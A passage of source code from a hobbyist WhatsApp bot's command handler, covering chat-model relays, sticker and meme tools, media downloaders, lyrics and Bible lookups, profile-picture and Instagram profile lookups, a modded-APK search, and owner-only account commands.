    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=llama-3.3-70b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "command-r-plus": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=command-r-plus`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "qwq": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=qwq-32b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "qwen2coder": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=qwen-2.5-coder-32b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "hermes-3": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=hermes-3`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "mistral-nemo": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=mistral-nemo`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "phi-3": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=phi-3.5-mini`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case 'getpp': {
  try {
    let userId;

    if (args[0] && args[0].toLowerCase() === 'me') {
      userId = m.sender;
    } else if (m.isGroup) {
      if (m.quoted) {
        userId = m.quoted.sender;
      } else {
        return reply("❌ Dans un groupe, réponds au message de la personne dont tu veux voir /la photo.");
      }
    } else {
      // En privé, on récupère la PP de l'interlocuteur
      userId = m.chat;
    }

    let ppUrl;
    try {
      ppUrl = await PhistarBotInc.profilePictureUrl(userId, 'image');
    } catch {
      return reply("❌ Impossible d'obtenir la photo de profil. L'utilisateur ne l'a peut-être pas ou elle est privée.");
    }

    await PhistarBotInc.sendMessage(m.chat, {
      image: { url: ppUrl },
      caption: `📷 𝐏𝐡𝐨𝐭𝐨 𝐝𝐞 𝐩𝐫𝐨𝐟𝐢𝐥 𝐝𝐞 : @${userId.split('@')[0]}`
    }, { quoted: m, mentions: [userId] });

  } catch (e) {
    console.error(e);
    reply("❌ Une erreur est survenue lors de la récupération de la photo.");
  }
}
break;


case 'listblock': {
    if (!isCreator) return replyphistar(`ғᴏʀ ᴍʏ ᴏᴡɴᴇʀ ᴏɴʟʏ`);
    let block = await PhistarBotInc.fetchBlocklist();
    replyphistar('List ʙʟᴏᴄᴋ :\n\n' + `ᴛᴏᴛᴀʟ : ${block == undefined ? '*0* Blocked' : '*' + block.length + '* Blocked'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`);
}
break;


case 'smeme': {
    let respond = `Send/reply image/sticker with caption ${prefix + command} text1|text2`;
    if (!/image/.test(mime)) return replyphistar(respond);
    if (!text) return replyphistar(respond);
    try {
        let atas = text.split('|')[0] ? text.split('|')[0] : '-';
        let bawah = text.split('|')[1] ? text.split('|')[1] : '-';
        let dwnld = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg);
        let fatGans = await TelegraPH(dwnld);
        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`;
        let FaTiH = await PhistarBotInc.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(dwnld);
    } catch (e) {
        console.error(e);
    }
}
break;


case 'delete':
case 'del': {
  if (!isCreator) return replyphistar("This command is restricted to owner only");
  if (!m.quoted) return zreply("Reply to a message to delete it");

  PhistarBotInc.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.quoted.id,
      participant: m.quoted.sender
    }
  });
}
break;

case 'leavegc': {
    if (!isCreator) return replyphistar('`ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴍʏ ᴏᴡɴᴇʀ ᴏɴʟʏ`');
    await PhistarBotInc.groupLeave(m.chat);
    await replyphistar('`Done!`');
}
break;

case 'tagall': {
    if (!m.isGroup) return replyphistar(mess.group);
    if (!isAdmins && !isCreator) return replyphistar(mess.admin);

    let teks = `〘      *𝑻𝒂𝒈𝒂𝒍𝒍  𝑩𝒚 𝑵𝑶𝑮𝑨𝑴𝑬 𝑻𝑬𝑪𝑯*     〙
 •• *ᴍᴇssᴀɢᴇ : ${q ? q : 'empty'}* ••\n\n`;

    for (let mem of participants) {
        teks += `⚡  @${mem.id.split('@')[0]}\n`;
    }

    PhistarBotInc.sendMessage(
        m.chat,
        { text: teks, mentions: participants.map(a => a.id) },
        { quoted: qtext2 }
    );
}
break;

case 'take': {
    if (!m.isGroup) return replyphistar('Reply with a sticker!');
    let stiker = false;
    try {
        let [packname, ...author] = text.split('|');
        author = (author || []).join('|');
        let mime = m?.quoted.mimetype || '';
        if (!/webp/.test(mime)) throw 'Reply with a sticker!';
        let img = await m?.quoted.download();
        if (!img) throw 'Failed to download sticker!';
        stiker = await addExif(img, packname || global.packname, author || global.author);
    } catch (e) {
        console.error(e);
        if (Buffer.isBuffer(e)) stiker = e;
        else throw 'An error occurred: ' + e;
    } finally {
        if (stiker) PhistarBotInc.sendMessage(m?.chat, { sticker: stiker }, { quoted: qtext2 });
        else throw 'Conversion failed';
    }
}
break;


case 'sticker':
case 'stiker':
case 's': {
    if (!quoted) return replyphistar(`Reply to an image or video with caption ${prefix + command}`);
    if (/image/.test(mime)) {
        const media = await quoted.download();
        await PhistarBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 seconds!');
        const media = await quoted.download();
        await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
    } else {
        return replyphistar(`Send an image or video with caption ${prefix + command}. Video should be 1-9 seconds.`);
    }
}
break;


case 'lyrics': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} faded | Alan Walker`);

    try {
        const [title, artist] = text.split('|').map(str => str.trim());
        if (!title || !artist) return replyphistar(`*Please provide both song title and artist, e.g.:* ${prefix + command} faded | Alan Walker`);

        await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎶`, key: m.key } });
        await replyphistar(`Searching For Lyrics`);
        const apiUrl = `https://api.giftedtech.co.ke/api/search/lyricsv2?apikey=gifted&query=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;
        const response = await axios.get(apiUrl);

        if (response.data && response.data.lyrics) {
            const { title, artist, lyrics } = response.data;

            const lyricsMessage = `🎵 *𝐋𝐘𝐑𝐈𝐂𝐒*\n\n` +
                                  `*🎶 ᴛɪᴛʟᴇ:* ${title}\n` +
                                  `*🎤 ᴀʀᴛɪsᴛ:* ${artist}\n\n` +
                                  `${lyrics}\n\n` +
                                  `> ɢᴇɴᴇʀᴀᴛᴇᴅ`;

            replyphistar(lyricsMessage);
        } else {
            replyphistar(`*No lyrics found for:* ${title} by ${artist}`);
        }
    } catch (error) {
        console.error('Error fetching lyrics:', error);
        replyphistar(`*Failed to fetch lyrics. Possible reasons:*\n1. Invalid title or artist.\n2. API issues.\n\n*Error Details:* ${error.message}`);
    }
    break;
}

case 'bible': {
    const BASE_URL = 'https://bible-api.com';
    const translate = require('@vitalets/google-translate-api');

    try {
        let chapterInput = m.text.split(' ').slice(1).join(' ').trim();
        if (!chapterInput) {
            return replyphistar(`❌ Please specify the chapter number or name.\nExample: ${prefix + command} John 3:16`);
        }

        let chapterRes = await fetch(`${BASE_URL}/${encodeURIComponent(chapterInput)}`);
        if (!chapterRes.ok) throw new Error("❌ Chapter not found.");

        let chapterData = await chapterRes.json();
        if (chapterData.error) throw new Error("❌ Verse or chapter not found.");

        // Translations
        let translatedChapterEnglish = await translate(chapterData.text, { to: 'en' });
        let translatedChapterHindi = await translate(chapterData.text, { to: 'hi' });

        let bibleChapter = `
📖 *THE HOLY BIBLE*

📜 *Reference:* ${chapterData.reference}
📘 Translation: ${chapterData.translation_name}
📑 Number of verses: ${chapterData.verses.length}

🔮 *English:*
${translatedChapterEnglish.text}

🔮 *Hindi:*
${translatedChapterHindi.text}
`;

        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({ text: bibleChapter }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '𝐍𝐎𝐇𝐀𝐌𝐄-𝐌𝐃' }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...await prepareWAMessageMedia(
                                { image: fs.readFileSync('./thumb.png') },
                                { upload: PhistarBotInc.waUploadToServer }
                            )
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"𝐀𝐌𝐄𝐍🙏","id":"bible_amen"}`
                            }]
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363420981848394@newsletter',
                                newsletterName: '𝐍𝐎𝐆𝐀𝐌𝐄-𝐗𝐌𝐃',
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: qtext2 });

        await PhistarBotInc.relayMessage(m.chat, msgs.message, {});
    } catch (error) {
        replyphistar(`❌ Error: ${error.message}`);
    }
}
break;

case "stickers": {
    if (!text) return replyphistar(`Ex: ${prefix + command} cat`);
    const anu = await stickersearch(text);
    const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
    const randomStickers = shuffledStickers.slice(0, 10);

    if (randomStickers.length > 0) {
        for (let i = 0; i < randomStickers.length; i++) {
            try {
                await new Promise(resolve => setTimeout(resolve, i * 6000));
                await PhistarBotInc.sendImageAsSticker(m?.chat, randomStickers[i], m, {
                    packname: global.packname,
                    author: global.author
                });
            } catch (error) {
                console.error(`Error sending file: ${error.message}`);
                await replyphistar(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
            }
        }
    }
}
break;


case "youtubsearch": case "yts": {
    try {
        let res = await yts(text);
        let url = res.all;
        let result = url[Math.floor(Math.random() * url.length)];

        async function image(url) {
            const { imageMessage } = await generateWAMessageContent({
                image: { url }
            }, {
                upload: PhistarBotInc.waUploadToServer
            });
            return imageMessage;
        }

        const url1 = result.thumbnail;
        const url2 = res.all[1].thumbnail;
        const url3 = res.all[2].thumbnail;

        const auth2 = res.all[1].author.name;
        const auth3 = res.all[2].author.name;

        const urlvid2 = res.all[1].url;
        const urlvid3 = res.all[2].url;

        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: `*( 3 BEST SEARCHES )*\n\n*[ 1 ]* \n-- ${result.title}\n\n*[ 2 ]* \n-- ${res.all[1].title}\n\n*[ 3 ]* \n-- ${res.all[2].title}` },
                            carouselMessage: {
                                cards: [
                                    {
                                        header: {
                                            imageMessage: await image(url1),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*R E S U L T - V I D *\n\n*Upload By:* ${result.author.name}\nUrl: ${result.url}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${result.url}"}`
                                                },
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${result.url}"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await image(url2),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*R E S U L T - V I D *\n\n*Upload By:* ${auth2}\nUrl: ${urlvid2}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${urlvid2}"}`
                                                },
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${urlvid2}"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await image(url3),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*R E S U L T - V I D *\n\n*Upload By:* ${auth3}\nUrl: ${urlvid3}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${urlvid3}"}`
                                                },
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${urlvid3}"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            },
            {}
        );

        await PhistarBotInc.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });

    } catch (error) {
        console.error(error);
    }
}
break;
case 'thai': {
    var notnot = JSON.parse(fs.readFileSync('./david-media/tiktokpics/thailand.json'));
    var hasil = pickRandom(notnot);
    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: '𝐍𝐎𝐆𝐀𝐌𝐄-𝐗𝐌𝐃'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: PhistarBotInc.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
                        }],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '',
                            newsletterName: 'Phistar',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: qtext2 });
    return await PhistarBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

case 'setbio': {
    if (!isCreator) return replyphistar('For My Owner Only');
    if (!text) return replyphistar(`Where is the text?\nExample: ${prefix + command} Phistar`);
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✍🏼`, key: m?.key } });
    await PhistarBotInc.updateProfileStatus(text);
    replyphistar('`Success in changing bio, Boss!!🫡`');
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
}
break;

case 'savevideo': {
    if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.includes('video')) {
        return replyphistar('❌ Reply to a *video file* with this command to save it.');
    }

    let videoPath = `${tempFolder}/video_${m.sender}.mp4`;

    try {
        let videoBuffer = await m.quoted.download();
        fs.writeFileSync(videoPath, videoBuffer);

        savedVideos[m.sender] = videoPath;
        saveVideoData(savedVideos);

        console.log(`✅ Video saved at: ${videoPath}`);
        replyphistar('✅ Video saved! Now reply to an audio file with `.addmusic` to merge.');
    } catch (err) {
        console.log('❌ Video Save Error:', err);
        replyphistar('❌ Failed to save the video.');
    }
}
break;


case 'setpp1':
case 'setpp':
case 'setppbot': {
    if (!isCreator) return replyphistar(`ғᴏʀ ᴍʏ ᴏᴡɴᴇʀ ᴏɴʟʏ`);
    if (!quoted)
        return replyphistar(`sᴇɴᴅ/ʀᴇᴘʟʏ ɪᴍᴀɢᴇ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴ ${prefix + command}`);
    if (!/image/.test(mime))
        return replyphistar(`sᴇɴᴅ/ʀᴇᴘʟʏ ɪᴍᴀɢᴇ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴ ${prefix + command}`);
    if (/webp/.test(mime))
        return replyphistar(`sᴇɴᴅ/ʀᴇᴘʟʏ ɪᴍᴀɢᴇ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴ ${prefix + command}`);

    // Download and save the image
    var media = await PhistarBotInc.downloadMediaMessage(quoted);
    const sharp = require("sharp");
    const tempFile = `ppbot_${Date.now()}.jpeg`;

    try {
        // Resize the image to a square dimension (e.g., 640x640)
        await sharp(media)
            .resize(640, 640, {
                fit: "cover",
            })
            .jpeg()
            .toFile(tempFile);

        // Set the profile picture
        if (args[0] === "full") {
            var { img } = await generateProfilePicture(tempFile);
            await PhistarBotInc.query({
                tag: "iq",
                attrs: {
                    to: botNumber,
                    type: "set",
                    xmlns: "w:profile:picture",
                },
                content: [
                    {
                        tag: "picture",
                        attrs: { type: "image" },
                        content: img,
                    },
                ],
            });
        } else {
            await PhistarBotInc.updateProfilePicture(botNumber, { url: tempFile });
        }

        // Cleanup
        fs.unlinkSync(tempFile);
        replyphistar(`Profile picture updated successfully!`);
    } catch (error) {
        console.error("Error setting profile picture:", error);
        replyphistar(`Failed to set profile picture. Try again.`);
    }
}
break;

case 'revoke':
case 'resetlink': {
    if (!m.isGroup) return replyphistar(`ғᴏʀ ɢʀᴏᴜᴘ ᴏɴʟʏ`);
    if (!isAdmins) return replyphistar(`ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ`);
    await PhistarBotInc.groupRevokeInvite(m.chat)
        .then(res => {
            replyphistar(`sᴜᴄᴄᴇssғᴜʟ ʀᴇsᴇᴛ, ɢʀᴏᴜᴘ ɪɴᴠɪᴛᴇ ʟɪɴᴋ ${groupMetadata.subject}`);
        })
        .catch(err => replyphistar(json(err)));
}
break;


case 'igstalk': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} marvel`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🔍`, key: m.key } });

    try {
        const res = await axios.get(`https://api.paxsenix.biz.id/stalker/instagram?username=${encodeURIComponent(text)}`);
        const data = res.data;

        if (!data.ok || !data.result) {
            return replyphistar(`❌ Failed to fetch IG data. Make sure the username is correct.`);
        }

        const ig = data.result;
        const caption = `*📸 Instagram Stalker Result*\n\n` +
                        `> *ᴜsᴇʀɴᴀᴍᴇ:* @${text}\n` +
                        `> *Name:* ${ig.nickname || "N/A"}\n` +
                        `> *ʙɪᴏ:* ${ig.bio || "N/A"}\n` +
                        `> *Posts:* ${ig.postsCount}\n` +
                        `> *ғᴏʟʟᴏᴡᴇʀs:* ${ig.followersCount}\n` +
                        `> *ғᴏʟʟᴏᴡɪɴɢ:* ${ig.followingCount}\n\n` +
                        `> ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ 𝐧𝐨𝐠𝐚𝐦𝐞 𝐭𝐞𝐜𝐡`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: ig.avatar },
            caption: caption
        }, { quoted: qtext2 });

        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

    } catch (err) {
        console.error("IGStalk Error:", err);
        replyphistar(`❌ Error occurred:\n> ${err.message}`);
    }

    break;
}



case 'mediafire': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://www.mediafire.com/file/n6tgcrktbnov1oy`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `📥`, key: m.key } });

        const apiUrl = `https://api.siputzx.my.id/api/d/mediafire?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

        if (apiResponse.data && apiResponse.data.downloadLink) {
            const { fileName, mimeType, downloadLink } = apiResponse.data;

            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: downloadLink },
                mimetype: mimeType,
                fileName: fileName,
                caption: `📦 *File Name:* ${fileName}\n\n> ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ 𝐧𝐨𝐠𝐚𝐦𝐞 𝐭𝐞𝐜𝐡`
            }, { quoted: qtext2 });
        } else {
            replyphistar(`*Failed to fetch file details! Please check the MediaFire URL and try again.*`);
        }
    } catch (error) {
        console.error('Error during MediaFire command:', error);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'ss': case 'ssweb': case 'screenshot': {
    if (!args[0]) return replyphistar(`ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ʟɪɴᴋ\n\n ᴇxᴀᴍᴘʟᴇ: ${prefix + command}.`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `📸`, key: m.key } });

    let apiUrl = `https://api.giftedtech.co.ke/api/tools/ssweb?apikey=gifted&url=${encodeURIComponent(args[0])}`;

    try {
        await PhistarBotInc.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🖼️ sᴄʀᴇᴇɴsʜᴏᴛ ᴏғ ${args[0]}` }, { quoted: qtext2 });
    } catch (error) {
        console.error(error);
        replyphistar('Failed to capture the screenshot. Please try again later.');
    }
    break;
}

case 'wanted': {
    // Ensure the command is a reply to an image
    if (!/image/.test(mime)) {
        return replyphistar(`*ʀᴇǫᴜᴇsᴛ ᴇʀʀᴏʀ!! ᴍᴇssᴀɢᴇ :*\n\n> *ʀᴇᴘʟʏ ᴛᴏ ᴀɴ ɪᴍᴀɢᴇ ᴡɪᴛʜ .ᴡᴀɴᴛᴇᴅ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ᴡᴀɴᴛᴇᴅ ᴘᴏsᴛᴇʀ*`);
    }

    // Check if there is a quoted message (the image)
    if (!quoted) {
        return replyphistar(`*ʀᴇǫᴜᴇsᴛ ᴇʀʀᴏʀ!! ᴍᴇssᴀɢᴇ :*\n\n> *ʀᴇᴘʟʏ ᴛᴏ ᴀɴ ɪᴍᴀɢᴇ ᴡɪᴛʜ .ᴡᴀɴᴛᴇᴅ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ᴡᴀɴᴛᴇᴅ ᴘᴏsᴛᴇʀ*`);
    }

    try {
        // React to show that processing has started
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Download the image locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image to Imgur
        const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replyphistar(`*ᴜᴘʟᴏᴀᴅ ᴇʀʀᴏʀ!! ᴍᴇssᴀɢᴇ :*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL

        // Call the "wanted" API with the uploaded image URL
        const apiResponse = await axios.get(`https://api.popcat.xyz/wanted`, {
            params: { image: imageUrl }
        });

        // Check the API response
        if (apiResponse.status === 200) {
            const wantedImageUrl = apiResponse.request.res.responseUrl; // The URL of the wanted poster

            // Send the wanted poster back to the user
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: wantedImageUrl },
                caption: `*ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ 𝐧𝐨𝐠𝐚𝐦𝐞 𝐭𝐞𝐜𝐡`
            }, { quoted: qtext2 });
        } else {
            replyphistar(`*WANTED POSTER ERROR!! MESSAGE :*\n\n> Failed to create a wanted poster. Try again.`);
        }

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);

    } catch (error) {
        console.error('Error in Wanted command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    // React to indicate success
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });
    break;
}
case 'mods': case 'modapk': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function mods(apk) {
        const url = `https://m.happymod.com/search.html?q=${apk}`;

        const response = await axios.get(url);
        const html = response.data;
        const $ = cheerio.load(html);

        const apps = [];

        $('.app-info-list .s-app-block').each((index, element) => {
            const app = {
                creator: '`𝐧𝐨𝐠𝐚𝐦𝐞 𝐛𝐨𝐲`',
                status: 200,
                title: $(element).find('.info-wrap .nowrap a').text().trim(),
                image: $(element).find('.img img').attr('data-src'),
                downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
            };
            apps.push(app);
            if (apps.length >= 5) return false;
        });

        return apps;
    }

    if (text) {
        const response = await mods(text);
        let result = '';

        response.forEach((app, index) => {
            result += `*${index + 1}*. ${app.title}:\n`;
            result += `∘ Download ${app.downloadUrl}\n\n`;
        });

        PhistarBotInc.sendMessage(m.chat, {
            text: result,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: false,
                    title: `M O D S  S E A R C H`,
                    body: `Looking for Cool and Free Apk Mods!`,
                    sourceUrl: 'https://m.happymod.com',
                    thumbnailUrl: 'https://imgur.com/a/PD8nT5X',
                    mediaType: 2,
                    renderLargerThumbnail: true
                }
            }
        });
    } else {
        replyphistar(`Enter Text, *Like This Format*: .${command} minecraft`);
    }
}
break;

case 'twitter':
case 'x': {
    if (!text) return replyphistar("❌ Please provide a Twitter/X URL.\n\nExample: .twitter https://x.com/elonmusk/status/1870901510319833540");

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "📥", key: m.key } });

    try {
        let response = await axios.get(`https://apis.prexzyvilla.site/download/aioV3?url=${encodeURIComponent(text)}`);

        if (response.data && response.data.status) {
            const { author, title, thumbnail, medias } = response.data.data;

            let caption = `📌 *ᴛᴡɪᴛᴛᴇʀ ᴠɪᴅᴇᴏ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ!*\n\n👤 *ᴀᴜᴛʜᴏʀ:* ${author}\n🎬 *ᴛɪᴛʟᴇ:* ${title}`;

            let mediaOptions = [];
            // Sort medias by quality (highest resolution first)
            const sortedMedias = medias.sort((a, b) => {
                const qualityA = parseInt(a.quality.replace('p', '')) || 0;
                const qualityB = parseInt(b.quality.replace('p', '')) || 0;
                return qualityB - qualityA;
            });

            sortedMedias.forEach(media => {
                mediaOptions.push({
                    video: { url: media.url },
                    mimetype: media.format,
                    caption: `${caption}\n🎥 *Quality:* ${media.quality}`,
                });
            });

            if (thumbnail) {
                let thumbnailBuffer = await axios.get(thumbnail, { responseType: "arraybuffer" });
                mediaOptions.forEach((obj) => (obj.jpegThumbnail = thumbnailBuffer.data));
            }

            for (let media of mediaOptions) {
                await PhistarBotInc.sendMessage(m.chat, media, { quoted: qtext2 });
                await sleep(3000); // Prevent rate limits
            }
        } else {
            replyphistar("❌ Failed to download the Twitter video.");
        }
    } catch (error) {
        console.error("❌ Twitter Download Error:", error);
        replyphistar("❌ An error occurred while fetching the video.");
    }

    break;
}

case 'clearchat': {
    PhistarBotInc.chatModify({
        delete: true, 
        lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
    }, m.chat);
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } }, { quoted: qtext2 });
    break;
}

case 'ghstalk': case 'githubstalk': {
    replyphistar('`ᴡᴀɪᴛ...`');
    if (!q) return replyphistar(`ᴇxᴀᴍᴘʟᴇ ${prefix+command} 𝐍𝐎𝐆𝐀𝐌𝐄`);
    replyphistar('`ᴘʀᴏᴄᴇssɪɴɢ...`'); 
